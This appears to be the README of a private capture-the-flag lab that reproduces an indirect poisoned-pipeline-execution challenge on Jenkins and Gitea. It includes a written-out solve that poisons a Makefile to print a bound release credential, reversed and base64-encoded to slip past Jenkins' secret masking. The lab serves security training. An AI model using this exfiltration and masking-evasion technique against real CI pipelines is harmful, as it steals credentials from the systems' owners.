# Mad Hatter: indirect poisoned pipeline execution (CyberCTF lab)

A bespoke, self-contained reproduction of the **Mad Hatter** challenge from
[CI/CD Goat](https://github.com/cider-security-research/cicd-goat) — OWASP **CICD-SEC-4, Poisoned
Pipeline Execution**. Wonderland runs CI on a **Jenkins** controller that builds the
`Wonderland/mad-hatter` application repository (hosted on a **Gitea** server) on every branch and
pull request. But the pipeline's `Jenkinsfile` is **not** in the application repo — it lives in a
separate, protected repository (`Wonderland/mad-hatter-pipeline`) that the attacker can read but not
modify, so editing the pipeline directly is impossible. That pipeline runs **`make`** inside the
application checkout with Wonderland's release token, `flag3`, bound into the build environment. An
attacker with write access to the application repo edits its **Makefile** — the build script the
pipeline invokes — to print `flag3`, pushes a branch and opens a pull request; the pipeline runs and
the flag lands in the build console. This is **Indirect-PPE**.

**Private lab content — do not copy into any public repository.**

## Infrastructure

Two machines, the minimum a live indirect-pipeline attack needs:

| Machine | What |
|---|---|
| `jenkins` | Jenkins controller, configured by Configuration-as-Code. A Job DSL seed creates the `wonderland-mad-hatter` multibranch pipeline: its **branch source** is the application repo (git-backed, branch discovery, rescanned every minute), but its `Jenkinsfile` is fetched from the separate `mad-hatter-pipeline` repo (the Remote Jenkinsfile Provider). `flag3` is a **Global-scope** username/password credential (its password is the flag), bound only inside the `make` stage. Builds run on the controller's own executor; `git`, `curl` and `make` are present. |
| `gitea` | Gitea git host. The setup job provisions the `Wonderland` org, the two private repos, the attacker `alice` (write on the app, read on the pipeline) and the poller `jenkins` (read on both), then pushes both sample projects. |

No GitLab, CTFd, prod box or SSH agents — only what this one vulnerability needs. The web ports
listen on container `8080` (Jenkins) and `3000` (Gitea); the host ports are assigned dynamically by
the runner (see below). Jenkins is slow to boot — allow a few minutes.

## Objective

One per-player objective (`.ctf/objectives.json`), graded by CyberBackend:

| Key | Evidence | What the player recovers |
|---|---|---|
| `mad-hatter` | `SECRET` (`%s`) | Wonderland's `flag3` release token, exfiltrated from the Jenkins credential store via a poisoned Makefile run by the protected pipeline |

Intended path: read the protected `Jenkinsfile` in `Wonderland/mad-hatter-pipeline` (you have read
access) and notice it runs `make` with `flag3` bound as `FLAG` → clone `Wonderland/mad-hatter` with
write creds → edit the `Makefile` so its default target runs `echo "$FLAG" | rev | base64` → push a
branch and open a pull request → the pipeline runs and prints the exfiltrated blob → reverse the
base64-decoded value. The recovered token is the flag. (Modern Jenkins masks the raw value *and* its
plain base64; reversing first evades the masker — see UPSTREAM.md.)

## Per-player flag

The flag is issued per player by CyberCTF and handed to the lab by the launcher as a **file**
(`isoloom.yml` `inputs: [CTF_FLAG_MAD_HATTER]`, delivered via
`files: [{ path: /run/lab/secrets/flag3, input: CTF_FLAG_MAD_HATTER }]` on the Jenkins machine),
never an environment variable, so it never appears in `docker inspect`, an image layer or a
generated file. The Jenkins entrypoint stages the file into the directory JCasC reads file secrets
from, so `flag3` (`password: "${flag3}"`) resolves at boot **into the credential store only** — the
pipeline must bind the credential to read it, exactly as in the challenge.

An **offline start** (local, CI) leaves the input empty, and the lab stages its development
placeholder (`.ctf/objectives.json` `dev`) instead, so it still comes up and is solvable without a
launcher.

## Dynamic ports

Both web services declare `ports: { web: { port: <n>, protocol: http, publish: true } }`.
`publish: true` asks the runner for a **free host port it picks at `up` time** — there is no fixed
host port anywhere in the spec, message, configs or checks (the only literals are in-container
loopback and the lab network CIDR). The `message` reads the real URLs back through
`{{ machines.jenkins.ports.web.url }}` and `{{ machines.gitea.ports.web.url }}`.

## Run it

Described once in [`isoloom.yml`](isoloom.yml) ([Isoloom](https://www.isoloom.com)); run on Docker
through the [Isothrum](https://www.isothrum.com) runner:

```bash
isoloom validate .
isoloom generate . --target docker
isothrum up . --target docker          # add --secret-from-env CTF_FLAG_MAD_HATTER for a real value
isothrum check . --target docker       # Jenkins is slow; the solver waits for the build
isothrum down . --target docker
```

Solve it the way the check does:

```bash
# you can read, but not modify, the pipeline:
git clone http://alice:alice@<gitea-url>/Wonderland/mad-hatter-pipeline.git   # it runs `make` with FLAG bound
# you CAN modify the application:
git clone http://alice:alice@<gitea-url>/Wonderland/mad-hatter.git
cd mad-hatter && git checkout -b challenge3
printf 'check:\n\t@echo "$${FLAG}" | rev | base64\n' > Makefile
git commit -am poison && git push origin challenge3
# open a PR in Gitea, then read the build console in Jenkins: `base64 -d <blob> | rev` is the flag
```

## Layout

- `build/jenkins/Dockerfile` — Jenkins LTS + plugins (incl. `remote-file`, `make`), runs as root to read the mounted secret
- `build/jenkins/casc/jenkins.yaml` — Configuration-as-Code: the Global-scope `flag3` credential, security, the Job DSL seed
- `build/jenkins/casc/jobdsl/mad-hatter.groovy` — the multibranch pipeline (app-repo branch source + 1-minute rescan; Jenkinsfile fetched from the pipeline repo)
- `build/jenkins/entrypoint.sh` — stages the per-player flag into the JCasC file-secret directory
- `build/jenkins/solve.sh` — the solver / self-check (`/usr/local/bin/mh-solve`): performs Indirect-PPE end to end and proves the flag was exfiltrated, never printing it
- `build/gitea/Dockerfile`, `app.ini`, `entrypoint.sh` — the installed Gitea host
- `build/gitea/seed.sh` — the `setup` step: provisions the org/users/repos and pushes both sample projects
- `build/gitea/app-src/` — the original `teaparty` application package and its `Makefile`
- `build/gitea/pipeline-src/` — the protected `Jenkinsfile` (and a note on why it lives apart)
- `.ctf/` — `metadata.json` and `objectives.json` (the catalogue registration)
- `UPSTREAM.md` — attribution, and the three implementation choices that differ from upstream
- `.isoloom/` — generated by `isoloom generate` (git-ignored; don't edit)
